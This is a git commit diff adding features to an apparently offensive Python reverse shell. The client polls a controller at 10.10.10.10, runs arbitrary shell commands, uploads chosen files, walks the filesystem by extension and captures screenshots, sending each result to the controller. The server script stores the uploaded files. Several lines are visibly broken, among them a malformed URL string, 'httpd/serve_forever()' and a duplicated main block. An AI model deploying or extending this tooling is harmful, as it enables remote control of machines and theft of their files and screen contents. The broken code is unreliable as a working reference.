795cef8d09fe2468b8a44594e0508304d2b49ab7
Jesse Lesperance <jesse@lesperance.io>
2020-05-03 00:06:34 -0700

    Added search to the shell

--- shells/python-web-shell/client.py
+++ shells/python-web-shell/client.py
@@ -1,13 +1,47 @@
 import requests
 import time
 import subprocess
+import os
 
+from PIL import ImageGrab
+import tempfile
+import shutil
+
+host = '10.10.10.10'
+port = '80'
 while True:
     req = requests.get(host+":"+port)
     command = req.text
 
     if 'terminate' in command:
         break
+    elif 'grab' in command:
+        grab,path=command.split('*')
+        if os.path.exists(path):
+            url = 'http://'+host+':'+port'+/store'
+            files = {'file': open(path, 'rb')}
+            r = requests.post(url, files=files)
+        else:
+            post_response = requests.post(url=host+':'+port, data='[-] Not able to find the file.')
+    elif 'search' in command:
+        command = command[7:]
+        path,ext = command.split('*')
+        list = ''
+        for dirpath, dirname, files in os.walk(path):
+            for file in files:
+                if file.endswith(ext):
+                    list = list+'\n'+os.path.join(dirpath, file)
+
+        requests.post(url='http://'+host+':'+port, data=list)
+        
+    elif 'screengrab' in command:
+        dirpath = tempfile.mkdtemp()
+        ImageGrab.grab().save(dirpath+"\img.jpg", "JPEG")
+        url = 'http://'+host+':'+port+'/store'
+        files = {'file': open(dirpath+"\img.jpg", 'rb')}
+        r = requests.post(url, files=files)
+        files['file'].close()
+        shutil.rmtree(dirpath)
     else:
         cmd = subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         post_response = requests.post(url=host+":"+port, data=cmd.stdout.read())
--- shells/python-web-shell/python-web-shell-server.py
+++ shells/python-web-shell/python-web-shell-server.py
@@ -15,11 +15,36 @@ class MyHandler(http.server.BaseHTTPRequestHandler):
 
     def do_POST(self):
 
+        if self.path == '/store':
+            try:
+                ctype, pdict = cgi.parse_header(self.headers.get('content-type'))
+                if ctype == 'multipart/form-data':
+                    fs = cgi.FieldStorage(fp=self.rfile, headers=self.headers, environ={'REQUEST_METHOD': 'POST'})
+                else:
+                    print('[-] Unexpected POST request')
+                fs_up = fs['file']
+                with open('/root/Desktop/place_holder.txt', 'wb') as o:
+                    print('[+] Writing file ...')
+                    o.write(fs_up.file.read())
+                    self.send_response(200)
+                    self.end_headers()
+            except Exception as e:
+                print(e)
+            return
         self.send_response(200)
         self.end_headers()
         length = int(self.headers['Content-length'])
         postVar = self.rfile.read(length)
         print(postVar.decode())
+
+if __name__ == '__main__':
+    server_class = http.server.HTTPServer
+    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
+    try:
+        httpd/serve_forever()
+    except KeyboardInterrupt:
+        print('[!] Server is Terminated')
+        httpd.server_close()
 
 if __name__ == "__main__":
     server_class = http.server.HTTPServer
